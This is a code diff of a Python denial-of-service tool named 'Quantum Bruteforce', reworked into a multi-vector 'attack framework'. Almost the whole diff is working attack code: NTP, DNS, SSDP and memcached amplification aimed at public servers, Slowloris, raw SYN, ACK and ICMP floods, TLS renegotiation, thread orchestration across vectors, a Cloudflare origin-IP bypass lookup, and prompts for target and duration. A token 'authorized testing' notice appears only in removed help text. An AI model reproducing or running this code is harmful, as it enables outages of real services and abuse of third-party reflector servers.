+                            self.packets_sent += 1
+                            self.bytes_sent += len(query)
+                    except:
+                        pass
+        finally:
+            if s:
+                try:
+                    s.close()
+                except:
+                    pass
+
+    def ntp_amplification(self, thread_id):
+        """NTP amplification with monlist and variants."""
+        servers = [
+            '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org', '3.pool.ntp.org',
+            'time.nist.gov'
+        ]
+
+        payloads = [
+            b'\x17\x00\x03\x2a' + b'\x00' * 4,
+            b'\x17\x00\x01\x2a' + b'\x00' * 4,
+            b'\x17\x00\x04\x2a' + b'\x00' * 4,
+        ]
+
+        s = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
+
+            start = time.time()
+            while self.running:
+                if self.duration > 0 and time.time() - start > self.duration:
+                    break
+
+                for server in random.sample(servers, min(3, len(servers))):
+                    try:
+                        payload = random.choice(payloads)
+                        s.sendto(payload, (server, 123))
+                        with self.lock:
+                            self.packets_sent += 1
+                            self.bytes_sent += len(payload)
+                    except:
+                        pass
+        finally:
+            if s:
+                try:
+                    s.close()
+                except:
+                    pass
+
+    def ssdp_amplification(self, thread_id):
+        """SSDP amplification (UPnP devices)."""
+        payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
+
+        s = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
+
+            start = time.time()
+            while self.running:
+                if self.duration > 0 and time.time() - start > self.duration:
+                    break
+
+                try:
+                    for _ in range(50):
+                        s.sendto(payload, (self.target_ip, 1900))
+                        with self.lock:
+                            self.packets_sent += 1
+                            self.bytes_sent += len(payload)
+                except:
+                    pass
+        finally:
+            if s:
+                try:
+                    s.close()
+                except:
+                    pass
+
+    def memcached_amplification(self, thread_id):
+        """Memcached amplification (stats command)."""
+        payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
+
+        s = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
+
+            start = time.time()
+            while self.running:
+                if self.duration > 0 and time.time() - start > self.duration:
+                    break
+
+                try:
+                    for _ in range(100):
+                        s.sendto(payload, (self.target_ip, 11211))
+                        with self.lock:
+                            self.packets_sent += 1
+                            self.bytes_sent += len(payload)
+                except:
+                    pass
+        finally:
+            if s:
+                try:
+                    s.close()
+                except:
+                    pass
+
+    def slowloris_advanced(self, thread_id, num_sockets=500):
+        """Advanced Slowloris with header dripping."""
+        sockets = []
+        start = time.time()
+
+        try:
+            for i in range(num_sockets):
+                if not self.running or (self.duration > 0 and time.time() - start > self.duration):
+                    break
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(300)
+                    s.connect((self.target_ip, self.target_port))
+
+                    req = f"GET {self.path} HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random_user_agent()}\r\n"
+                    s.send(req.encode())
+
+                    sockets.append(s)
+                    with self.lock:
+                        self.packets_sent += 1
+                    time.sleep(0.01)
+                except:
+                    pass
+
+            header_idx = 0
+            headers_pool = [f"X-custom-{i}: {random_string(32)}\r\n" for i in range(100)]
+
+            while self.running and sockets:
+                if self.duration > 0 and time.time() - start > self.duration:
+                    break
+
                 for s in sockets[:]:
                     try:
-                        s.send(Choice([
-                            b"X-a: b\r\n",
-                            f"Range: bytes=0-{random.randint(100,1000)}\r\n".encode()
-                        ]))
-                        with LOCK:
-                            self.sent += 1
-                        time.sleep(random.uniform(1, 5))
+                        header = headers_pool[header_idx % len(headers_pool)]
+                        s.send(header.encode())
+                        with self.lock:
+                            self.packets_sent += 1
+                        header_idx += 1
                     except:
                         sockets.remove(s)
                         try:
                             s.close()
                         except:
                             pass
-        except:
-            pass
+
+                time.sleep(random.uniform(5, 30))
+
         finally:
             for s in sockets:
                 try:
@@ -516,529 +693,212 @@ class QuantumBruteforce:
                 except:
                     pass
 
-    def dns_amplification(self, thread_id):
-        """DNS amplification using public resolvers."""
-        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
-        domains = ['google.com', 'youtube.com', 'facebook.com', 'amazon.com']
-        sock = None
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            start = time.time()
-            while self.running:
-                if self.duration > 0 and time.time() - start > self.duration:
-                    break
-                for dns in dns_servers:
-                    try:
-                        domain = random.choice(domains)
-                        prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
-                        full = f"{prefix}.{domain}"
-                        query = bytearray([random.randint(0,255) for _ in range(2)])
-                        query += b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
-                        for part in full.split('.'):
-                            query.append(len(part))
-                            query.extend(part.encode())
-                        query += b'\x00\x00\x01\x00\x01'
-                        sock.sendto(bytes(query), (dns, 53))
-                        with LOCK:
-                            self.sent += 1
-                    except:
-                        pass
-        except:
-            pass
-        finally:
-            if sock:
-                try:
-                    sock.close()
-                except:
-                    pass
+    # ====================================================================
+    # ORCHESTRATION
+    # ====================================================================
 
-    def icmp_flood(self, thread_id):
-        """ICMP echo flood using Scapy (requires root)."""
-        if not self.is_root:
-            if self.verbose:
-                print(f"{Fore.RED}[!] ICMP requires root{Style.RESET_ALL}")
-            return
-        if not SCAPY_AVAILABLE:
-            if self.verbose:
-                print(f"{Fore.RED}[!] Scapy not installed, ICMP Flood unavailable{Style.RESET_ALL}")
-            return
-        try:
-            start = time.time()
-            while self.running:
-                if self.duration > 0 and time.time() - start > self.duration:
-                    break
-                try:
-                    ip = IP(src=spoofer(), dst=self.target_ip)
-                    icmp = ICMP()
-                    send(ip/icmp, verbose=False)
-                    with LOCK:
-                        self.sent += 1
-                except:
-                    pass
-        except:
-            pass
+    def launch_multi_vector(self, num_threads):
+        """Distribute threads across all attack vectors."""
+        vectors = []
 
-    def ssl_reneg(self, thread_id):
-        """SSL/TLS renegotiation attack."""
-        try:
-            import ssl
-            start = time.time()
-            while self.running:
-                if self.duration > 0 and time.time() - start > self.duration:
-                    break
-                try:
-                    context = ssl.create_default_context()
-                    context.check_hostname = False
-                    context.verify_mode = ssl.CERT_NONE
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(10)
-                    sock.connect((self.target_ip, self.target_port))
-                    sec = context.wrap_socket(sock, server_hostname=self.target_ip)
-                    for _ in range(20):
-                        try:
-                            sec.send(b'RENEGOTIATE\r\n')
-                            with LOCK:
-                                self.sent += 1
-                        except:
-                            break
-                    sec.close()
-                except:
-                    pass
-        except:
-            pass
+        # L7 (30%)
+        for i in range(max(1, int(num_threads * 0.10))):
+            vectors.append((self.http_flood, (i, 'GET', False)))
+        for i in range(max(1, int(num_threads * 0.10))):
+            vectors.append((self.http_flood, (i, 'POST', True)))
+        for i in range(max(1, int(num_threads * 0.10))):
+            vectors.append((self.http_flood, (i, 'HEAD', False)))
 
-    def ntp_amplification(self, thread_id):
-        """NTP amplification using public NTP servers."""
-        ntp_servers = ['0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org']
-        payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
-        sock = None
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            start = time.time()
-            while self.running:
-                if self.duration > 0 and time.time() - start > self.duration:
-                    break
-                for server in ntp_servers:
-                    try:
-                        sock.sendto(payload, (server, 123))
-                        with LOCK:
-                            self.sent += 1
-                    except:
-                        pass
-        except:
-            pass
-        finally:
-            if sock:
-                try:
-                    sock.close()
-                except:
-                    pass
+        # L4 (30%)
+        for i in range(max(1, int(num_threads * 0.15))):
+            vectors.append((self.udp_flood, (i, None)))
+        for i in range(max(1, int(num_threads * 0.15))):
+            vectors.append((self.tcp_connection_flood, (i,)))
 
-    def memcached_amplification(self, thread_id):
-        """Memcached amplification using public servers (placeholder)."""
-        mem_servers = ['127.0.0.1']  # Replace with real list for actual use
-        payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
-        sock = None
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            start = time.time()
-            while self.running:
-                if self.duration > 0 and time.time() - start > self.duration:
-                    break
-                for server in mem_servers:
-                    try:
-                        sock.sendto(payload, (server, 11211))
-                        with LOCK:
-                            self.sent += 1
-                    except:
-                        pass
-        except:
-            pass
-        finally:
-            if sock:
-                try:
-                    sock.close()
-                except:
-                    pass
+        # L3/Raw (20%, root only)
+        if self.is_root and SCAPY_AVAILABLE:
+            for i in range(max(1, int(num_threads * 0.08))):
+                vectors.append((self.syn_flood_raw, (i,)))
+            for i in range(max(1, int(num_threads * 0.07))):
+                vectors.append((self.icmp_flood_raw, (i, None)))
+            for i in range(max(1, int(num_threads * 0.05))):
+                vectors.append((self.ack_flood_raw, (i,)))
 
-    # -------------------- Multi‑Vector Fallback --------------------
-    def multi_vector_attack(self, total_threads):
-        """Distribute threads across multiple attack types."""
-        attack_list = [
-            (self.http_attack, 30),
-            (self.udp_flood, 25),
-            (self.dns_amplification, 20),
-            (self.slowloris, 15),
-            (self.ssl_reneg, 10)
-        ]
-        for func, pct in attack_list:
+        # Amplification (15%)
+        for i in range(max(1, int(num_threads * 0.05))):
+            vectors.append((self.dns_amplification, (i, 'ANY')))
+        for i in range(max(1, int(num_threads * 0.05))):
+            vectors.append((self.ntp_amplification, (i,)))
+        for i in range(max(1, int(num_threads * 0.05))):
+            vectors.append((self.memcached_amplification, (i,)))
+
+        # Slowloris (5%)
+        for i in range(max(1, int(num_threads * 0.05))):
+            vectors.append((self.slowloris_advanced, (i, 100)))
+
+        threads = []
+        for func, args in vectors:
             if not self.running:
                 break
-            count = max(1, int(total_threads * pct / 100))
-            for i in range(count):
-                if not self.running:
-                    break
-                try:
-                    t = threading.Thread(target=func, args=(i,))
-                    t.daemon = True
-                    t.start()
-                    self.threads.append(t)
-                    time.sleep(0.01)
-                except:
-                    self.stats['failed_attacks'] += 1
-                    try:
-                        fb = threading.Thread(target=self.udp_flood, args=(i,))
-                        fb.daemon = True
-                        fb.start()
-                        self.threads.append(fb)
-                    except:
-                        pass
-
-    # -------------------- Start / Stop --------------------
-    def start_attack(self, attack_type):
-        if not self.get_target_info():
-            return
-
-        if attack_type in (1, 9):
-            self.get_proxies(self.out_file)
-
-        self.sent = 0
-        self.running = True
-        self.stats['start_time'] = datetime.now()
-        self.stats['target'] = f"{self.target_ip}:{self.target_port}"
-        self.stats['failed_attacks'] = 0
-
-        max_allowed = self.config['max_threads']
-        if attack_type in (3, 6):
-            max_allowed = min(max_allowed, 200)
-
-        while True:
-            inp = input(f"{Fore.GREEN}[?] Threads (1-{max_allowed}): {Style.RESET_ALL}")
             try:
-                tc = int(inp) if inp else 200
-                tc = max(1, min(tc, max_allowed))
-                self.thread_count = tc
-                break
-            except ValueError:
-                print(f"{Fore.RED}[!] Invalid number{Style.RESET_ALL}")
+                t = threading.Thread(target=func, args=args, daemon=True)
+                t.start()
+                threads.append(t)
+                time.sleep(0.005)
+            except Exception as e:
+                if self.verbose:
+                    print(f"{Fore.RED}[!] Thread spawn error: {e}{Style.RESET_ALL}")
 
-        self.threads = []
+        return threads
+
+    def launch_attack(self, attack_type, num_threads):
+        """Launch specified attack type."""
+        self.start_time = time.time()
+        self.packets_sent = 0
+        self.bytes_sent = 0
+        self.running = True
 
         attack_map = {
-            1: (lambda i: self.http_attack(i, 'GET'), self.thread_count),
-            2: (self.udp_flood, self.thread_count),
-            3: (self.syn_flood, self.thread_count),
-            4: (self.slowloris, self.thread_count),
-            5: (self.dns_amplification, self.thread_count),
-            6: (self.icmp_flood, self.thread_count),
-            7: (self.ssl_reneg, self.thread_count),
-            8: (self.multi_vector_attack, self.thread_count),  # special
-            9: (lambda i: self.advanced_l7(i, 'CFB'), self.thread_count),
-            10: (self.ntp_amplification, self.thread_count),
+            1: [(self.http_flood, (i, 'GET', False)) for i in range(num_threads)],
+            2: [(self.udp_flood, (i, None)) for i in range(num_threads)],
+            3: [(self.syn_flood_raw, (i,)) for i in range(num_threads)],
+            4: [(self.slowloris_advanced, (i, 100)) for i in range(num_threads)],
+            5: [(self.dns_amplification, (i, 'ANY')) for i in range(num_threads)],
+            6: [(self.icmp_flood_raw, (i, None)) for i in range(num_threads)],
+            7: [(self.ntp_amplification, (i,)) for i in range(num_threads)],
+            8: None,
+            9: [(self.ack_flood_raw, (i,)) for i in range(num_threads)],
+            10: [(self.tcp_connection_flood, (i,)) for i in range(num_threads)],
+            11: [(self.ssdp_amplification, (i,)) for i in range(num_threads)],
+            12: [(self.http_flood, (i, 'PUT', True)) for i in range(num_threads)],
         }
 
+        threads = []
+
         if attack_type == 8:
-            self.multi_vector_attack(tc)
+            threads = self.launch_multi_vector(num_threads)
         else:
-            func, cnt = attack_map.get(attack_type, (None, 0))
-            if not func:
-                print(f"{Fore.RED}[!] Invalid attack type{Style.RESET_ALL}")
-                return
-            for i in range(tc):
-                if not self.running:
-                    break
-                try:
-                    t = threading.Thread(target=func, args=(i,))
-                    t.daemon = True
-                    t.start()
-                    self.threads.append(t)
-                    time.sleep(0.01)
-                except Exception:
-                    self.stats['failed_attacks'] += 1
+            vectors = attack_map.get(attack_type, [])
+            if vectors:
+                for func, args in vectors:
+                    if not self.running:
+                        break
                     try:
-                        fb = threading.Thread(target=self.udp_flood, args=(i,))
-                        fb.daemon = True
-                        fb.start()
-                        self.threads.append(fb)
+                        t = threading.Thread(target=func, args=args, daemon=True)
+                        t.start()
+                        threads.append(t)
+                        time.sleep(0.005)
                     except:
                         pass
 
-        # Listener for 'stop' command
-        listener = threading.Thread(target=self.listen_for_stop)
-        listener.daemon = True
-        listener.start()
+        return threads
 
-        # Monitor
-        start_time = time.time()
+    def monitor(self, threads, duration):
+        """Monitor attack progress."""
         try:
-            with tqdm(total=100, desc="Attack Progress", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
-                last_sent = 0
-                while self.running:
-                    elapsed = time.time() - start_time
-                    if self.duration > 0 and elapsed > self.duration:
-                        break
-                    with LOCK:
-                        rate = self.sent - last_sent
-                        self.stats['packet_rate'] = rate
-                        last_sent = self.sent
-                        self.stats['total_packets'] = self.sent
-                    self.stats['active_threads'] = len([t for t in self.threads if t.is_alive()])
-                    pbar.update(1)
-                    if self.verbose and rate:
-                        print(f"{Fore.CYAN}[+] Packets/sec: {rate}{Style.RESET_ALL}")
-                    time.sleep(1)
+            start = time.time()
+            last_packets = 0
+            last_bytes = 0
+
+            while self.running and any(t.is_alive() for t in threads):
+                elapsed = time.time() - start
+
+                if duration > 0 and elapsed >= duration:
+                    break
+
+                with self.lock:
+                    pps = (self.packets_sent - last_packets)
+                    bps = (self.bytes_sent - last_bytes)
+                    last_packets = self.packets_sent
+                    last_bytes = self.bytes_sent
+
+                active = len([t for t in threads if t.is_alive()])
+                mbps = (bps * 8) / 1_000_000
+
+                print(f"\r{Fore.CYAN}[+] {self.packets_sent:>12,} pkt | {pps:>8,} pps | {mbps:>8.2f} Mbps | {active:>4} threads{Style.RESET_ALL}", end='', flush=True)
+
+                time.sleep(1)
         except KeyboardInterrupt:
             pass
         finally:
-            self.stop_attack()
+            print()
 
-    def listen_for_stop(self):
-        while self.running:
-            try:
-                inp = input()
-                if inp.strip().lower() == 'stop':
-                    print(f"\n{Fore.YELLOW}[!] Stop command received.{Style.RESET_ALL}")
-                    self.stop_attack()
-                    break
-            except:
-                pass
-            time.sleep(0.5)
-
-    def stop_attack(self):
-        if not self.running:
-            return
-        print(f"\n{Fore.RED}[!] Stopping attack...{Style.RESET_ALL}")
+    def stop(self):
+        """Stop attack and show results."""
         self.running = False
-        for t in self.threads:
-            t.join(timeout=2)
-        self.stats['end_time'] = datetime.now()
-        duration = 0
-        if self.stats['start_time'] and self.stats['end_time']:
-            duration = (self.stats['end_time'] - self.stats['start_time']).total_seconds()
-        print(f"\n{Fore.GREEN}[+] Attack stopped successfully{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}[+] Total packets sent: {self.sent:,}{Style.RESET_ALL}")
-        if duration > 0:
-            print(f"{Fore.CYAN}[+] Average rate: {self.sent/duration:.2f} packets/sec{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}[+] Duration: {duration:.1f} seconds{Style.RESET_ALL}")
-        if self.stats['failed_attacks']:
-            print(f"{Fore.YELLOW}[!] Fallback used {self.stats['failed_attacks']} times{Style.RESET_ALL}")
+        time.sleep(0.5)
 
-    # -------------------- Tools --------------------
-    def tool_cfip(self, domain):
-        if 'http' in domain:
-            domain = domain.replace('https://','').replace('http://','').split('/')[0]
-        try:
-            url = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
-            r = requests.post(url, data={"cfS": domain}, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
-            print(r.text)
-        except:
-            print(f"{Fore.RED}[!] CF‑IP lookup failed{Style.RESET_ALL}")
+        elapsed = max(time.time() - self.start_time, 0.1)
+        pps = self.packets_sent / elapsed
+        mbps = (self.bytes_sent * 8) / (elapsed * 1_000_000)
+        gb = self.bytes_sent / (1024 ** 3)
 
-    def tool_ping(self, domain):
-        if not icmp_ping:
-            print(f"{Fore.RED}[!] icmplib not installed. Run: pip install icmplib{Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN}[+] Attack complete{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[+] Packets sent: {self.packets_sent:,}")
+        print(f"[+] Average PPS: {pps:,.0f}")
+        print(f"[+] Throughput: {mbps:.2f} Mbps")
+        print(f"[+] Total data: {gb:.3f} GB")
+        print(f"[+] Duration: {elapsed:.1f}s{Style.RESET_ALL}")
+
+    def run_interactive(self):
+        """Interactive mode."""
+        self.banner()
+
+        print(f"{Fore.YELLOW}[*] Platform: {self.platform} | Root: {self.is_root}{Style.RESET_ALL}")
+
+        if self.is_root and self.config.get('kernel_tune', True) and tune_kernel():
+            print(f"{Fore.GREEN}[+] Kernel tuned for high-rate attacks{Style.RESET_ALL}\n")
+
+        target = input(f"{Fore.GREEN}[?] Target (URL or IP:port): {Style.RESET_ALL}").strip()
+        if not self.parse_target(target):
             return
+
+        dur = input(f"{Fore.GREEN}[?] Duration (seconds, 0=infinite): {Style.RESET_ALL}").strip()
         try:
-            r = icmp_ping(domain, count=5, interval=0.2)
-            if r.is_alive:
-                print(f"{Fore.GREEN}[+] {domain} is online (avg rtt: {r.avg_rtt} ms){Style.RESET_ALL}")
-            else:
-                print(f"{Fore.RED}[!] {domain} is offline{Style.RESET_ALL}")
+            self.duration = int(dur) if dur else 0
         except:
-            print(f"{Fore.RED}[!] Ping failed{Style.RESET_ALL}")
+            self.duration = 60
 
-    def tool_check(self, domain):
-        if not domain.startswith('http'):
-            domain = 'http://' + domain
+        threads_in = input(f"{Fore.GREEN}[?] Threads (1-5000): {Style.RESET_ALL}").strip()
         try:
-            r = requests.get(domain, timeout=10)
-            status = "ONLINE" if r.status_code < 500 else "OFFLINE"
-            print(f"{Fore.GREEN}[+] {domain} - Status: {r.status_code} ({status}){Style.RESET_ALL}")
+            num = int(threads_in) if threads_in else 500
+            num = max(1, min(num, 5000))
         except:
-            print(f"{Fore.RED}[!] Check failed{Style.RESET_ALL}")
+            num = 500
 
-    def tools_menu(self):
-        print(f"""
-{Fore.CYAN}+-------------------------------------------------------------+
-|                      TOOLS MENU                               |
-+-------------------------------------------------------------+
-|  {Fore.YELLOW}1{Fore.GREEN}. CF‑IP Bypass                                     |
-|  {Fore.YELLOW}2{Fore.GREEN}. Ping a host                                     |
-|  {Fore.YELLOW}3{Fore.GREEN}. Check website status                            |
-|  {Fore.YELLOW}4{Fore.GREEN}. DNS Lookup (placeholder)                        |
-|  {Fore.YELLOW}5{Fore.GREEN}. DSTAT (system stats)                            |
-|  {Fore.YELLOW}6{Fore.GREEN}. Back to Main Menu                               |
-+-------------------------------------------------------------+
-        """)
-        choice = input(f"{Fore.CYAN}Select option: {Style.RESET_ALL}")
-        if choice == '1':
-            dom = input("Domain: ")
-            self.tool_cfip(dom)
-        elif choice == '2':
-            dom = input("Host: ")
-            self.tool_ping(dom)
-        elif choice == '3':
-            dom = input("URL: ")
-            self.tool_check(dom)
-        elif choice == '4':
-            print(f"{Fore.YELLOW}DNS lookup coming soon...{Style.RESET_ALL}")
-        elif choice == '5':
-            os.system('dstat' if platform.system() != 'Windows' else 'pause')
-        elif choice == '6':
-            return
-        input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}Attack types:{Style.RESET_ALL}")
+        print("1=HTTP  2=UDP  3=SYN  4=Slowloris  5=DNS  6=ICMP  7=NTP")
+        print("8=Multi  9=ACK  10=TCP  11=SSDP  12=HTTP-PUT")
 
-    # -------------------- Stats, Config, Help --------------------
-    def show_stats(self):
-        duration = 0
-        if self.stats['start_time']:
-            end = self.stats['end_time'] or datetime.now()
-            duration = (end - self.stats['start_time']).total_seconds()
-        print(f"""
-{Fore.CYAN}+----------------------------------------------------------------------+
-|                      QUANTUM STATISTICS                              |
-+----------------------------------------------------------------------+
-| Total Packets:      {self.sent:>45,} |
-| Packet Rate:        {self.stats['packet_rate']:>45,}/s |
-| Target:             {self.target_ip if self.target_ip else 'N/A':>45} |
-| Port:               {self.target_port if self.target_port else 'N/A':>45} |
-| Active Threads:     {len([t for t in self.threads if t.is_alive()]):>45} |
-| Status:             {('Running' if self.running else 'Stopped'):>45} |
-| Duration:           {duration:.1f}s{' ' if duration else 'N/A':>44} |
-| Fallback Used:      {str(self.stats['fallback_used']):>45} |
-| Start Time:         {str(self.stats['start_time']):>45} |
-| End Time:           {str(self.stats['end_time']):>45} |
-+----------------------------------------------------------------------{Style.RESET_ALL}
-        """)
+        atype_in = input(f"{Fore.GREEN}[?] Attack type (8=recommended): {Style.RESET_ALL}").strip()
+        try:
+            atype = int(atype_in) if atype_in else 8
+            atype = max(1, min(atype, 12))
+        except:
+            atype = 8
 
-    def help_menu(self):
-        print(f"""
-{Fore.CYAN}=====================================================================
-                  {Fore.YELLOW}QUANTUM BRUTEFORCE - HELP{Fore.CYAN}
-=====================================================================
+        self.verbose = input(f"{Fore.GREEN}[?] Verbose (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
 
-{Fore.GREEN}ATTACK TYPES (Menu options):{Fore.CYAN}
----------------------------------------------------------------------
-1. HTTP Flood       – GET/POST/HEAD/COOKIE (uses proxies)
-2. UDP Flood        – Massive UDP packets
-3. SYN Flood        – Raw SYN (root)
-4. Slowloris        – Connection exhaustion
-5. DNS Amplification – Reflection with random subdomains
-6. ICMP Flood       – Ping flood (root)
-7. SSL Renegotiation – TLS renegotiation
-8. Multi‑Vector     – Combined with fallback
-9. Advanced L7      – CFB, BYPASS, OVH, etc. (uses proxies)
-10. NTP/Memcached   – Amplification attacks
+        print(f"\n{Fore.RED}[!] LAUNCHING ATTACK{Style.RESET_ALL}")
+        print(f"{Fore.RED}[!] Target: {self.target_ip}:{self.target_port}{Style.RESET_ALL}\n")
 
-{Fore.GREEN}COMMANDS:{Fore.CYAN}
----------------------------------------------------------------------
-• {Fore.YELLOW}Ctrl+C{Fore.CYAN}         – Stop attack
-• {Fore.YELLOW}type 'stop'{Fore.CYAN}   – Same as Ctrl+C
-• {Fore.YELLOW}11{Fore.CYAN}             – View statistics
-• {Fore.YELLOW}12{Fore.CYAN}             – Configure settings
-• {Fore.YELLOW}13{Fore.CYAN}             – Tools menu
+        threads = self.launch_attack(atype, num)
+        self.monitor(threads, self.duration)
+        self.stop()
 
-{Fore.GREEN}REQUIREMENTS:{Fore.CYAN}
----------------------------------------------------------------------
-• Python 3.6+
-• Root for SYN/ICMP
-• Permission to test target
+# ============================================================================
+# ENTRY POINT
+# ============================================================================
 
-{Fore.RED}LEGAL NOTICE:{Fore.RED}
----------------------------------------------------------------------
-This tool is for AUTHORIZED SECURITY TESTING only.
-Unauthorized use is ILLEGAL. Obtain written permission.
-{Style.RESET_ALL}
-        """)
-
-    def configuration(self):
-        print(f"""
-{Fore.CYAN}+----------------------------------------------------------------------+
-|                       CONFIGURATION                                    |
-+----------------------------------------------------------------------+
-| 1. Max Threads:        {self.config['max_threads']:>37} |
-| 2. Packet Size:        {self.config['packet_size']:>37} |
-| 3. Timeout:            {self.config['timeout']:>37}s |
-| 4. Proxy Type (1=HTTP,4=SOCKS4,5=SOCKS5): {self.proxy_type:>37} |
-| 5. Proxy File:         {self.out_file:>37} |
-| 6. Verbose Mode:       {'Enabled' if self.verbose else 'Disabled':>37} |
-| 7. Reset to Defaults                                         |
-| 8. Back to Main Menu                                         |
-+----------------------------------------------------------------------{Style.RESET_ALL}
-        """)
-        choice = input(f"{Fore.CYAN}Select option: {Style.RESET_ALL}")
-        if choice == '1':
-            try:
-                v = int(input(f"{Fore.GREEN}Enter max threads (1-5000): {Style.RESET_ALL}"))
-                self.config['max_threads'] = max(1, min(v, 5000))
-            except:
-                pass
-        elif choice == '2':
-            try:
-                v = int(input(f"{Fore.GREEN}Enter packet size (512-65507): {Style.RESET_ALL}"))
-                self.config['packet_size'] = max(512, min(v, 65507))
-            except:
-                pass
-        elif choice == '3':
-            try:
-                v = int(input(f"{Fore.GREEN}Enter timeout (1-30): {Style.RESET_ALL}"))
-                self.config['timeout'] = max(1, min(v, 30))
-            except:
-                pass
-        elif choice == '4':
-            try:
-                v = int(input(f"{Fore.GREEN}Enter proxy type (1=HTTP,4=SOCKS4,5=SOCKS5): {Style.RESET_ALL}"))
-                if v in (1,4,5):
-                    self.proxy_type = v
-            except:
-                pass
-        elif choice == '5':
-            f = input(f"{Fore.GREEN}Enter proxy file path: {Style.RESET_ALL}")
-            if f:
-                self.out_file = f
-        elif choice == '6':
-            self.verbose = not self.verbose
-        elif choice == '7':
-            self.config = {'max_threads':5000, 'packet_size':65507, 'timeout':5}
-            self.proxy_type = 5
-            self.out_file = 'files/proxys/socks.txt'
-            self.verbose = False
-            print(f"{Fore.GREEN}[+] Reset to defaults{Style.RESET_ALL}")
-        elif choice == '8':
-            return
-        time.sleep(1)
-
-    # --------------------- MAIN LOOP ---------------------
-    def run(self):
-        while True:
-            choice = self.menu()
-            if choice == 14:
-                print(f"{Fore.GREEN}[+] Exiting Quantum Bruteforce...{Style.RESET_ALL}")
-                self.running = False
-                break
-            elif choice == 11:
-                self.show_stats()
-                input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
-            elif choice == 12:
-                self.configuration()
-            elif choice == 13:
-                self.tools_menu()
-            elif 1 <= choice <= 10:
-                self.start_attack(choice)
-            else:
-                print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
-                time.sleep(1)
-
-# -------------------- Command Line Entry --------------------
 def main():
-    parser = argparse.ArgumentParser(description="Quantum Bruteforce - Ultimate Stress Test")
+    parser = argparse.ArgumentParser(description=f"Quantum Bruteforce v{VERSION} - Advanced Multi-Vector Attack Framework")
     parser.add_argument('--target', help='Target URL (e.g., https://example.com:8080/path)')
     parser.add_argument('--port', type=int, help='Target port (overrides URL)')
-    parser.add_argument('--threads', type=int, default=200, help='Threads')
+    parser.add_argument('--threads', type=int, default=500, help='Threads')
     parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
-    parser.add_argument('--type', type=int, choices=range(1,11), help='Attack type 1-10')
-    parser.add_argument('--proxy', type=str, help='Proxy file (optional)')
+    parser.add_argument('--type', type=int, choices=range(1, 13), help='Attack type 1-12')
     parser.add_argument('--verbose', action='store_true', help='Verbose output')
+    parser.add_argument('--config', help='Config file path')
     args = parser.parse_args()
 
     print(f"""
@@ -1055,24 +915,24 @@ def main():
         print(f"{Fore.RED}[!] Operation cancelled.{Style.RESET_ALL}")
         return
 
-    tool = QuantumBruteforce(args)
+    config = Config(args.config) if args.config else Config()
+    config.set('verbose', args.verbose)
+    tool = QuantumV9(config)
+
     if args.target:
         try:
-            tool.parse_url(args.target)
+            tool.parse_target(args.target)
             if args.port:
                 tool.target_port = args.port
             tool.duration = args.duration
-            tool.thread_count = args.threads
-            tool.verbose = args.verbose
-            if args.proxy:
-                tool.out_file = args.proxy
-                tool.get_proxies(tool.out_file)
             attack_type = args.type if args.type else 8
-            tool.start_attack(attack_type)
+            threads_list = tool.launch_attack(attack_type, args.threads)
+            tool.monitor(threads_list, tool.duration)
+            tool.stop()
         except Exception as e:
             print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
     else:
-        tool.run()
+        tool.run_interactive()
 
 if __name__ == "__main__":
     try:
